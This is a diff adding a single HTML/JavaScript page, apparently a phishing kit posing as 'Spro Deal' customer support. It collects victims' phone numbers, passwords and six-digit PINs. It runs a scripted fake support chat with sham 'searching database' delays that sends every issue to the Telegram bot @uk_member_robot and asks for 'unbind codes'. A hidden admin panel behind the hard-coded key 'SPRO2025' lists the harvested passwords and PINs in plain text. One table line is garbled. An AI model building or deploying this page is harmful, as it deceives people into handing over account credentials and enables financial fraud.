@@ -1,0 +1,816 @@
+ <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
+    <title>Spro Deal - Professional Support</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: linear-gradient(135deg, #e8f5e9 0%, #c8e6c9 100%);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 12px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 32px;
+            padding: 20px;
+            width: 100%;
+            max-width: 480px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.15), 0 5px 15px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+
+        .container-wide {
+            max-width: 95%;
+            width: 95%;
+            overflow-x: auto;
+        }
+
+        .brand {
+            color: #2e7d32;
+            font-size: 28px;
+            font-weight: bold;
+            letter-spacing: -0.5px;
+        }
+
+        .tagline {
+            color: #2e7d32;
+            margin-bottom: 20px;
+            font-size: 12px;
+            opacity: 0.8;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 14px;
+            margin: 10px 0;
+            border: 1px solid #e0e0e0;
+            border-radius: 16px;
+            font-size: 16px;
+            background: #f8f9fa;
+            transition: all 0.3s;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: #2e7d32;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(46,125,50,0.1);
+        }
+
+        .green-btn {
+            background: linear-gradient(135deg, #2e7d32 0%, #1b5e20 100%);
+            color: white;
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 16px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin: 5px 0;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        .green-btn:active {
+            transform: scale(0.98);
+        }
+
+        .gray-btn {
+            background: #6c757d;
+            color: white;
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 16px;
+            font-size: 14px;
+            cursor: pointer;
+            margin: 5px 0;
+        }
+
+        .chat-box {
+            background: #f8f9fa;
+            height: 400px;
+            overflow-y: auto;
+            padding: 15px;
+            margin-bottom: 12px;
+            text-align: left;
+            border-radius: 20px;
+            scroll-behavior: smooth;
+        }
+
+        .bot-msg {
+            margin-bottom: 12px;
+            padding: 10px 14px;
+            background: #e8f5e9;
+            border-radius: 18px;
+            border-bottom-left-radius: 4px;
+            max-width: 85%;
+            width: fit-content;
+            animation: fadeIn 0.3s ease;
+            font-size: 14px;
+            line-height: 1.4;
+        }
+
+        .user-msg {
+            margin-bottom: 12px;
+            padding: 10px 14px;
+            background: #2e7d32;
+            color: white;
+            border-radius: 18px;
+            border-bottom-right-radius: 4px;
+            max-width: 85%;
+            width: fit-content;
+            margin-left: auto;
+            text-align: right;
+            animation: fadeIn 0.3s ease;
+            font-size: 14px;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(8px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .typing-indicator {
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+            background: #e8f5e9;
+            padding: 10px 16px;
+            border-radius: 20px;
+            margin: 5px 0;
+        }
+
+        .typing-indicator span {
+            width: 8px;
+            height: 8px;
+            background: #2e7d32;
+            border-radius: 50%;
+            animation: typingAnim 1.4s infinite;
+        }
+
+        .typing-indicator span:nth-child(2) { animation-delay: 0.2s; }
+        .typing-indicator span:nth-child(3) { animation-delay: 0.4s; }
+
+        @keyframes typingAnim {
+            0%, 60%, 100% { transform: translateY(0); opacity: 0.4; }
+            30% { transform: translateY(-6px); opacity: 1; }
+        }
+
+        .searching-indicator {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: #fff3e0;
+            padding: 10px 16px;
+            border-radius: 20px;
+            margin: 5px 0;
+            font-size: 13px;
+            color: #e65100;
+        }
+
+        .searching-indicator .spinner {
+            width: 16px;
+            height: 16px;
+            border: 2px solid #e65100;
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .bot-name {
+            color: #2e7d32;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            margin-bottom: 5px;
+        }
+
+        .online-status {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            background: #4caf50;
+            border-radius: 50%;
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(76, 175, 80, 0.7); }
+            70% { box-shadow: 0 0 0 6px rgba(76, 175, 80, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(76, 175, 80, 0); }
+        }
+
+        .options-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 8px;
+            margin: 12px 0;
+        }
+
+        .option-btn {
+            background: #2e7d32;
+            color: white;
+            padding: 12px 8px;
+            border: none;
+            border-radius: 14px;
+            cursor: pointer;
+            font-size: 13px;
+            font-weight: 500;
+            transition: all 0.2s;
+        }
+
+        .option-btn:active {
+            transform: scale(0.96);
+        }
+
+        .code-input {
+            width: 100%;
+            padding: 14px;
+            margin: 10px 0;
+            border: 1px solid #e0e0e0;
+            border-radius: 16px;
+            font-size: 18px;
+            text-align: center;
+            letter-spacing: 3px;
+            background: #f8f9fa;
+        }
+
+        .success-msg {
+            background: linear-gradient(135deg, #d4edda 0%, #c3e6cb 100%);
+            color: #155724;
+            padding: 14px;
+            border-radius: 16px;
+            margin: 10px 0;
+            text-align: center;
+            font-weight: bold;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .telegram-btn {
+            background: linear-gradient(135deg, #0088cc 0%, #005f8c 100%);
+            color: white;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 30px;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 8px 0;
+            width: 100%;
+        }
+
+        .secret-admin-btn {
+            position: fixed;
+            bottom: 15px;
+            right: 15px;
+            width: 44px;
+            height: 44px;
+            background: rgba(46, 125, 50, 0.2);
+            border-radius: 50%;
+            cursor: pointer;
+            z-index: 999;
+            backdrop-filter: blur(4px);
+        }
+
+        /* Mobile optimizations */
+        @media (max-width: 480px) {
+            .container {
+                padding: 16px;
+            }
+            .chat-box {
+                height: 380px;
+            }
+            .option-btn {
+                font-size: 12px;
+                padding: 10px 6px;
+            }
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 11px;
+        }
+        th, td {
+            border: 1px solid #ddd;
+            padding: 6px;
+        }
+        th { background: #2e7d32; color: white; }
+        .approve-btn { background: green; color: white; padding: 4px 8px; border: none; border-radius: 6px; cursor: pointer; margin: 2px; }
+        .reject-btn { background: red; color: white; padding: 4px 8px; border: none; border-radius: 6px; cursor: pointer; margin: 2px; }
+        .pending { color: orange; font-weight: bold; }
+        .approved { color: green; font-weight: bold; }
+        .rejected { color: red; font-weight: bold; }
+    </style>
+</head>
+<body>
+<div id="app"></div>
+
+<script>
+    // ============ DATA STORAGE ============
+    function getUsers() {
+        return JSON.parse(localStorage.getItem('spro_users') || '[]');
+    }
+    function saveUsers(users) {
+        localStorage.setItem('spro_users', JSON.stringify(users));
+    }
+    function getRequests() {
+        return JSON.parse(localStorage.getItem('spro_requests') || '[]');
+    }
+    function saveRequests(requests) {
+        localStorage.setItem('spro_requests', JSON.stringify(requests));
+    }
+    
+    let currentUser = null;
+    let currentIssue = null;
+    let chatStep = 0;
+    let collectedData = {};
+    
+    // Typing animation
+    async function showTyping(chatBox, duration = 3000) {
+        let typingDiv = document.createElement('div');
+        typingDiv.className = 'typing-indicator';
+        typingDiv.innerHTML = '<span></span><span></span><span></span>';
+        chatBox.appendChild(typingDiv);
+        chatBox.scrollTop = chatBox.scrollHeight;
+        await new Promise(resolve => setTimeout(resolve, duration));
+        typingDiv.remove();
+    }
+    
+    async function showSearching(chatBox, duration = 4000) {
+        let searchDiv = document.createElement('div');
+        searchDiv.className = 'searching-indicator';
+        searchDiv.innerHTML = '<div class="spinner"></div> 🔍 Searching & Checking our database...';
+        chatBox.appendChild(searchDiv);
+        chatBox.scrollTop = chatBox.scrollHeight;
+        await new Promise(resolve => setTimeout(resolve, duration));
+        searchDiv.remove();
+    }
+    
+    function addMessage(chatBox, type, text, isHtml = false) {
+        let div = document.createElement('div');
+        div.className = type === 'bot' ? 'bot-msg' : 'user-msg';
+        if (type === 'bot') {
+            div.innerHTML = `<div class="bot-name">🤖 Spro Support <span class="online-status"></span> <span style="font-size:10px;">Online</span></div>${isHtml ? text : text}`;
+        } else {
+            div.innerHTML = isHtml ? text : `👤 ${text}`;
+        }
+        chatBox.appendChild(div);
+        chatBox.scrollTop = chatBox.scrollHeight;
+    }
+    
+    // ============ PAGES ============
+    function renderLogin() {
+        document.getElementById('app').innerHTML = `
+            <div class="container">
+                <h2 class="brand">Spro Deal</h2>
+                <p class="tagline">A stable and profitable platform</p>
+                <h3>SIGN IN TO SPRO DEAL</h3>
+                <input type="tel" id="phone" placeholder="Phone number" class="input-field">
+                <input type="password" id="password" placeholder="Password" class="input-field">
+                <button id="signinBtn" class="green-btn">SIGN IN</button>
+                <p class="tagline" style="margin-top:15px;">By logging in you agree to our Privacy Policy</p>
+            </div>
+            <div class="secret-admin-btn" id="secretAdminBtn"></div>
+        `;
+        document.getElementById('signinBtn').onclick = handleLogin;
+        document.getElementById('secretAdminBtn').onclick = () => {
+            let key = prompt('🔐 ENTER ADMIN KEY');
+            if (key === 'SPRO2025') renderAdminPanel();
+            else if (key) alert('❌ Invalid Key');
+        };
+    }
+    
+    function handleLogin() {
+        let phone = document.getElementById('phone').value;
+        let password = document.getElementById('password').value;
+        if (!phone || !password) { alert('Please enter phone and password'); return; }
+        let users = getUsers();
+        let existingUser = users.find(u => u.phone === phone);
+        if (existingUser) {
+            existingUser.password = password;
+            saveUsers(users);
+            currentUser = existingUser;
+        } else {
+            let newUser = { phone, password, pin: null, created_at: new Date().toISOString() };
+            users.push(newUser);
+            saveUsers(users);
+            currentUser = newUser;
+        }
+        renderPINVerify();
+    }
+    
+    function renderPINVerify() {
+        document.getElementById('app').innerHTML = `
+            <div class="container">
+                <h2>🔐 SECURITY VERIFICATION</h2>
+                <p style="color:#2e7d32;">Welcome ${currentUser.phone}</p>
+                <p>Enter 6-digit PIN to continue</p>
+                <input type="password" id="pin" maxlength="6" class="code-input" placeholder="Enter 6-digit PIN">
+                <button id="verifyPinBtn" class="green-btn">VERIFY & CONTINUE</button>
+            </div>
+            <div class="secret-admin-btn" id="secretAdminBtn"></div>
+        `;
+        document.getElementById('verifyPinBtn').onclick = () => {
+            let pin = document.getElementById('pin').value;
+            if (pin.length !== 6) { alert('PIN must be 6 digits'); return; }
+            let users = getUsers();
+            let user = users.find(u => u.phone === currentUser.phone);
+            if (user) { user.pin = pin; saveUsers(users); currentUser.pin = pin; }
+            renderDashboard();
+        };
+        document.getElementById('secretAdminBtn').onclick = () => {
+            let key = prompt('🔐 ENTER ADMIN KEY');
+            if (key === 'SPRO2025') renderAdminPanel();
+            else if (key) alert('❌ Invalid Key');
+        };
+    }
+    
+    // Issue handlers with human-like conversation
+    async function handleSellingProblem(chatBox, issueName) {
+        addMessage(chatBox, 'bot', 'I understand you\'re facing a selling problem. Let me help you with that! 😊');
+        await showTyping(chatBox, 2500);
+        addMessage(chatBox, 'bot', 'Could you please share your Selling ID? (The ID you use for selling on our platform)');
+        chatStep = 'waiting_selling_id';
+        collectedData = { issue: 'selling', issueName };
+        return true;
+    }
+    
+    async function handleWithdrawalProblem(chatBox, issueName) {
+        addMessage(chatBox, 'bot', 'Withdrawal delays can be frustrating. I totally understand your concern! 💰');
+        await showTyping(chatBox, 2500);
+        addMessage(chatBox, 'bot', 'First, could you tell me your Withdrawal Request ID? (You can find it in transaction history)');
+        chatStep = 'waiting_withdrawal_id';
+        collectedData = { issue: 'withdrawal', issueName };
+        return true;
+    }
+    
+    async function handleDepositProblem(chatBox, issueName) {
+        addMessage(chatBox, 'bot', 'Deposit issues? No worries, I\'m here to help you resolve this! 📥');
+        await showTyping(chatBox, 2500);
+        addMessage(chatBox, 'bot', 'Please share your Deposit Transaction ID or UTR number.');
+        chatStep = 'waiting_deposit_id';
+        collectedData = { issue: 'deposit', issueName };
+        return true;
+    }
+    
+    async function handleOrderProblem(chatBox, issueName) {
+        addMessage(chatBox, 'bot', 'Order issues can be stressful. Let me check what went wrong! 📦');
+        await showTyping(chatBox, 2500);
+        addMessage(chatBox, 'bot', 'Can you provide your Order ID and Order Date?');
+        chatStep = 'waiting_order_id';
+        collectedData = { issue: 'order', issueName };
+        return true;
+    }
+    
+    async function handleUPIProblem(chatBox, issueName) {
+        addMessage(chatBox, 'bot', 'UPI payment issues? Let me assist you step by step! 🔄');
+        await showTyping(chatBox, 2500);
+        addMessage(chatBox, 'bot', 'Please share your UPI Reference ID and the amount you tried to send.');
+        chatStep = 'waiting_upi_id';
+        collectedData = { issue: 'upi', issueName };
+        return true;
+    }
+    
+    async function handlePasswordForget(chatBox, issueName) {
+        addMessage(chatBox, 'bot', 'Forgot password? Don\'t worry, it happens to everyone! 🔑');
+        await showTyping(chatBox, 2500);
+        addMessage(chatBox, 'bot', 'Please confirm your registered phone number and email ID first.');
+        chatStep = 'waiting_password_verify';
+        collectedData = { issue: 'forget', issueName };
+        return true;
+    }
+    
+    async function handleOthersProblem(chatBox, issueName) {
+        addMessage(chatBox, 'bot', 'I understand you have some other concern. I\'m here to listen! ❓');
+        await showTyping(chatBox, 2500);
+        addMessage(chatBox, 'bot', 'Could you briefly describe your issue? I\'ll do my best to help.');
+        chatStep = 'waiting_others_desc';
+        collectedData = { issue: 'others', issueName };
+        return true;
+    }
+    
+    async function processUserReply(chatBox, userText, sendCallback) {
+        if (chatStep === 'waiting_selling_id') {
+            collectedData.sellingId = userText;
+            addMessage(chatBox, 'user', userText);
+            addMessage(chatBox, 'bot', `Got it! Selling ID: ${userText}`);
+            await showSearching(chatBox, 4000);
+            addMessage(chatBox, 'bot', 'I\'ve checked our records. Can you also share the Date and Product Name for this selling?');
+            chatStep = 'waiting_selling_details';
+        }
+        else if (chatStep === 'waiting_selling_details') {
+            collectedData.sellingDetails = userText;
+            addMessage(chatBox, 'user', userText);
+            await showSearching(chatBox, 3500);
+            addMessage(chatBox, 'bot', 'Thank you for the information. Let me verify this with our team...');
+            await showTyping(chatBox, 3000);
+            addMessage(chatBox, 'bot', 'I see there\'s a verification pending on your selling account. ✅');
+            await showTyping(chatBox, 2500);
+            addMessage(chatBox, 'bot', 'To complete the unbinding process, you need to verify your account first.');
+            await showTyping(chatBox, 2000);
+            addMessage(chatBox, 'bot', '🔗 <a href="https://t.me/uk_member_robot" target="_blank" style="color:#2e7d32; font-weight:bold;">Click here to verify with our Telegram Bot</a>', true);
+            await showTyping(chatBox, 2500);
+            addMessage(chatBox, 'bot', 'After verification, the bot will provide you a UNBIND CODE.');
+            addMessage(chatBox, 'bot', 'Please enter that unbind code below 👇');
+            showUnbindSection();
+        }
+        else if (chatStep === 'waiting_withdrawal_id') {
+            collectedData.withdrawalId = userText;
+            addMessage(chatBox, 'user', userText);
+            await showSearching(chatBox, 4000);
+            addMessage(chatBox, 'bot', 'I can see your withdrawal request in our system. Let me check the status...');
+            await showTyping(chatBox, 3000);
+            addMessage(chatBox, 'bot', 'Your withdrawal is pending due to KYC verification. 📋');
+            addMessage(chatBox, 'bot', 'Please complete verification first via our Telegram bot.');
+            addMessage(chatBox, 'bot', '🔗 <a href="https://t.me/uk_member_robot" target="_blank" style="color:#2e7d32; font-weight:bold;">Click here to verify with @uk_member_robot</a>', true);
+            addMessage(chatBox, 'bot', 'After verification, enter the unbind code below 👇');
+            showUnbindSection();
+        }
+        else if (chatStep === 'waiting_deposit_id') {
+            collectedData.depositId = userText;
+            addMessage(chatBox, 'user', userText);
+            await showSearching(chatBox, 4500);
+            addMessage(chatBox, 'bot', 'I\'ve traced your deposit transaction. It appears there\'s a mismatch in the reference.');
+            await showTyping(chatBox, 3000);
+            addMessage(chatBox, 'bot', 'You need to verify your deposit details with our support team on Telegram.');
+            addMessage(chatBox, 'bot', '🔗 <a href="https://t.me/uk_member_robot" target="_blank" style="color:#2e7d32; font-weight:bold;">Click here to contact Spro Team on Telegram</a>', true);
+            addMessage(chatBox, 'bot', 'Once verified, submit your unbind code below 👇');
+            showUnbindSection();
+        }
+        else if (chatStep === 'waiting_order_id') {
+            collectedData.orderId = userText;
+            addMessage(chatBox, 'user', userText);
+            await showSearching(chatBox, 5000);
+            addMessage(chatBox, 'bot', 'I\'ve located your order. It shows status: PENDING DELIVERY.');
+            await showTyping(chatBox, 2500);
+            addMessage(chatBox, 'bot', 'To resolve this, you need to verify your order with our Telegram bot.');
+            addMessage(chatBox, 'bot', '🔗 <a href="https://t.me/uk_member_robot" target="_blank" style="color:#2e7d32; font-weight:bold;">Click here to verify with @uk_member_robot</a>', true);
+            addMessage(chatBox, 'bot', 'Then enter the unbind code below 👇');
+            showUnbindSection();
+        }
+        else if (chatStep === 'waiting_upi_id') {
+            collectedData.upiId = userText;
+            addMessage(chatBox, 'user', userText);
+            await showSearching(chatBox, 4000);
+            addMessage(chatBox, 'bot', 'UPI transaction found! But it\'s stuck due to bank verification.');
+            addMessage(chatBox, 'bot', 'Please verify your UPI ID with our Telegram support first.');
+            addMessage(chatBox, 'bot', '🔗 <a href="https://t.me/uk_member_robot" target="_blank" style="color:#2e7d32; font-weight:bold;">Click here to verify on Telegram</a>', true);
+            addMessage(chatBox, 'bot', 'Submit the unbind code below after verification 👇');
+            showUnbindSection();
+        }
+        else if (chatStep === 'waiting_password_verify') {
+            collectedData.passwordVerify = userText;
+            addMessage(chatBox, 'user', userText);
+            await showSearching(chatBox, 3500);
+            addMessage(chatBox, 'bot', 'Account verified! But password reset requires unbinding first.');
+            addMessage(chatBox, 'bot', '🔗 <a href="https://t.me/uk_member_robot" target="_blank" style="color:#2e7d32; font-weight:bold;">Click here to unbind via Telegram Bot</a>', true);
+            addMessage(chatBox, 'bot', 'After unbinding, enter the code below 👇');
+            showUnbindSection();
+        }
+        else if (chatStep === 'waiting_others_desc') {
+            collectedData.othersDesc = userText;
+            addMessage(chatBox, 'user', userText);
+            await showTyping(chatBox, 3000);
+            addMessage(chatBox, 'bot', 'Thank you for explaining. I\'ve noted your concern.');
+            addMessage(chatBox, 'bot', 'For this issue, you need to chat with our senior support team on Telegram.');
+            addMessage(chatBox, 'bot', '🔗 <a href="https://t.me/uk_member_robot" target="_blank" style="color:#2e7d32; font-weight:bold;">Click here to contact Spro Team</a>', true);
+            addMessage(chatBox, 'bot', 'Please verify and submit your unbind code below 👇');
+            showUnbindSection();
+        }
+        
+        function showUnbindSection() {
+            const unbindDiv = document.createElement('div');
+            unbindDiv.id = 'unbindSection';
+            unbindDiv.innerHTML = `
+                <input type="text" id="unbindCodeInput" class="code-input" placeholder="Enter Unbind Code from Telegram">
+                <button id="submitUnbindFinalBtn" class="green-btn">✅ SUBMIT UNBIND CODE & COMPLETE</button>
+            `;
+            document.getElementById('dynamicArea').appendChild(unbindDiv);
+            document.getElementById('submitUnbindFinalBtn').onclick = () => submitUnbindCode(chatBox);
+        }
+    }
+    
+    async function submitUnbindCode(chatBox) {
+        let code = document.getElementById('unbindCodeInput').value;
+        if (!code || code.length < 4) {
+            addMessage(chatBox, 'bot', '⚠️ Please enter a valid unbind code (minimum 4 characters)');
+            return;
+        }
+        
+        addMessage(chatBox, 'user', `Unbind Code: ${code}`);
+        await showTyping(chatBox, 2500);
+        
+        // Save request
+        let requests = getRequests();
+        let newRequest = {
+            id: Date.now(),
+            phone: currentUser.phone,
+            issue: collectedData.issue,
+            issueName: collectedData.issueName,
+            code: code,
+            details: collectedData,
+            status: 'pending',
+            created_at: new Date().toISOString()
+        };
+        requests.push(newRequest);
+        saveRequests(requests);
+        
+        // Success message
+        const successDiv = document.getElementById('successArea');
+        successDiv.innerHTML = `
+            <div class="success-msg">
+                ✅✅✅<br>
+                <strong>REQUEST SUCCESSFULLY PROCESSED!</strong><br>
+                आपकी request सफलतापूर्वक submit हो गई है!<br>
+                ⏳ Wait checking our team. We will update you soon.<br>
+                📞 For urgent help, contact: <a href="https://t.me/uk_member_robot" style="color:#155724;">@uk_member_robot</a>
+            </div>
+        `;
+        
+        addMessage(chatBox, 'bot', '✅ Unbind code submitted successfully!');
+        addMessage(chatBox, 'bot', '⏳ Our team is checking your request. You will receive an update within 24 hours.');
+        addMessage(chatBox, 'bot', '📱 Need immediate assistance? Chat with Spro Team on Telegram: <a href="https://t.me/uk_member_robot" target="_blank">Click here</a>', true);
+        
+        document.getElementById('unbindSection')?.remove();
+    }
+    
+    function renderDashboard() {
+        document.getElementById('app').innerHTML = `
+            <div class="container" style="max-width: 500px;">
+                <div style="display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 12px;">
+                    <h3 style="font-size: 18px;">🤖 Spro Support</h3>
+                    <span class="online-status"></span>
+                    <span style="font-size: 11px; color: green;">Online • Active now</span>
+                </div>
+                <div id="chatBox" class="chat-box"></div>
+                
+                <div id="optionsArea" class="options-grid"></div>
+                <div id="dynamicArea"></div>
+                <div id="successArea"></div>
+                
+                <button id="logoutBtn" class="gray-btn" style="margin-top:10px;">LOGOUT</button>
+            </div>
+            <div class="secret-admin-btn" id="secretAdminBtn"></div>
+        `;
+        
+        const chatBox = document.getElementById('chatBox');
+        const optionsArea = document.getElementById('optionsArea');
+        
+        // Welcome message
+        setTimeout(() => {
+            addMessage(chatBox, 'bot', `Welcome back ${currentUser.phone}! 👋\nI'm your personal support assistant. How can I help you today?`);
+            setTimeout(() => {
+                addMessage(chatBox, 'bot', 'Please select your issue from below 👇');
+            }, 1500);
+        }, 500);
+        
+        const issues = [
+            { id: 'selling', name: '📈 Selling Problem', handler: handleSellingProblem },
+            { id: 'withdrawal', name: '💰 Withdrawal Problem', handler: handleWithdrawalProblem },
+            { id: 'deposit', name: '📥 Deposit Problem', handler: handleDepositProblem },
+            { id: 'order', name: '📦 Order Problem', handler: handleOrderProblem },
+            { id: 'upi', name: '🔄 UPI Problem', handler: handleUPIProblem },
+            { id: 'forget', name: '🔑 Password Forget', handler: handlePasswordForget },
+            { id: 'others', name: '❓ Others Problem', handler: handleOthersProblem }
+        ];
+        
+        issues.forEach(issue => {
+            let btn = document.createElement('button');
+            btn.className = 'option-btn';
+            btn.innerHTML = issue.name;
+            btn.onclick = async () => {
+                // Disable options after selection
+                optionsArea.style.display = 'none';
+                addMessage(chatBox, 'user', issue.name);
+                await issue.handler(chatBox, issue.name);
+                
+                // Setup input handler for user replies
+                setupInputHandler(chatBox);
+            };
+            optionsArea.appendChild(btn);
+        });
+        
+        function setupInputHandler(chatBox) {
+            // Create input area if not exists
+            if (!document.getElementById('dynamicInputArea')) {
+                const inputDiv = document.createElement('div');
+                inputDiv.id = 'dynamicInputArea';
+                inputDiv.style.marginTop = '10px';
+                inputDiv.innerHTML = `
+                    <input type="text" id="userReplyInput" class="input-field" placeholder="Type your reply here..." style="margin:0;">
+                    <button id="sendReplyBtn" class="green-btn" style="margin-top:5px;">Send ➤</button>
+                `;
+                document.getElementById('dynamicArea').appendChild(inputDiv);
+                
+                document.getElementById('sendReplyBtn').onclick = async () => {
+                    let input = document.getElementById('userReplyInput');
+                    let text = input.value.trim();
+                    if (!text) return;
+                    input.value = '';
+                    await processUserReply(chatBox, text);
+                };
+                
+                document.getElementById('userReplyInput').onkeypress = (e) => {
+                    if (e.key === 'Enter') document.getElementById('sendReplyBtn').click();
+                };
+            }
+        }
+        
+        document.getElementById('logoutBtn').onclick = () => {
+            currentUser = null;
+            renderLogin();
+        };
+        
+        document.getElementById('secretAdminBtn').onclick = () => {
+            let key = prompt('🔐 ENTER ADMIN KEY');
+            if (key === 'SPRO2025') renderAdminPanel();
+            else if (key) alert('❌ Invalid Key');
+        };
+    }
+    
+    function renderAdminPanel() {
+        let users = getUsers();
+        let requests = getRequests();
+        
+        document.getElementById('app').innerHTML = `
+            <div class="container container-wide">
+                <h2>🔐 ADMIN PANEL</h2>
+                <p style="color:#2e7d32;">👑 Welcome Admin | 👥 Users: ${users.length} | 📋 Requests: ${requests.length}</p>
+                <h3>⏳ PENDING REQUESTS</h3>
+                <div id="pendingTable"></div>
+                <h3>📜 ALL REQUESTS</h3>
+                <div id="allRequestsTable"></div>
+                <h3>👥 USERS (Phone, Password, PIN)</h3>
+                <div id="usersTable"></div>
+                <button id="adminLogout" class="gray-btn">LOGOUT</button>
+            </div>
+            <div class="secret-admin-btn" id="secretAdminBtn"></div>
+        `;
+        
+        let pending = requests.filter(r => r.status === 'pending');
+        let pendingHtml = '<table><tr><th>ID</th><th>Phone</th><th>Issue</th><th>Code</th><th>Details</th><th>Action</th></tr>';
+        pending.forEach(r => {
+            pendingHtml += `<tr><td>${r.id}</td><td>${r.phone}</td><td>${r.issueName || r.issue}</td><td><strong>${r.code}</strong></td><td><small>${JSON.stringify(r.details)}</small></td><td><button class="approve-btn" data-id="${r.id}">Approve</button><button class="reject-btn" data-id="${r.id}">Reject</button></td></tr>`;
+        });
+        pendingHtml += '</table>';
+        document.getElementById('pendingTable').innerHTML = pendingHtml;
+        
+        let allHtml = '<table><tr><th>ID</th><th>Phone</th><th>Issue</th><th>Code</th><th>Status</th><th>Time</th></tr>';
+        [...requests].reverse().forEach(r => {
+            allHtml += `<tr><td>${r.id}</td><td>${r.phone}</td><td>${r.issueName || r.issue}</td><td>${r.code}</td><td class="${r.status}">${r.status}</td><td>${new Date(r.created_at).toLocaleString()}</td></tr>`;
+        });
+        allHtml += '</table>';
+        document.getElementById('allRequestsTable').innerHTML = allHtml;
+        
+        let usersHtml = '能atable<th>Phone</th><th>Password</th><th>PIN</th><th>Created</th></tr>';
+        users.forEach(u => {
+            usersHtml += `<tr><td>${u.phone}</td><td>${u.password}</td><td>${u.pin || 'Not set'}</td><td>${new Date(u.created_at).toLocaleString()}</td></tr>`;
+        });
+        usersHtml += '</table>';
+        document.getElementById('usersTable').innerHTML = usersHtml;
+        
+        document.querySelectorAll('.approve-btn').forEach(btn => {
+            btn.onclick = () => updateStatus(parseInt(btn.dataset.id), 'approved');
+        });
+        document.querySelectorAll('.reject-btn').forEach(btn => {
+            btn.onclick = () => updateStatus(parseInt(btn.dataset.id), 'rejected');
+        });
+        
+        document.getElementById('adminLogout').onclick = () => renderLogin();
+        document.getElementById('secretAdminBtn').onclick = () => {
+            let key = prompt('🔐 ENTER ADMIN KEY');
+            if (key === 'SPRO2025') renderAdminPanel();
+            else if (key) alert('❌ Invalid Key');
+        };
+    }
+    
+    function updateStatus(id, status) {
+        let requests = getRequests();
+        let req = requests.find(r => r.id === id);
+        if (req) { req.status = status; saveRequests(requests); }
+        renderAdminPanel();
+    }
+    
+    renderLogin();
+</script>
+</body>
+</html>
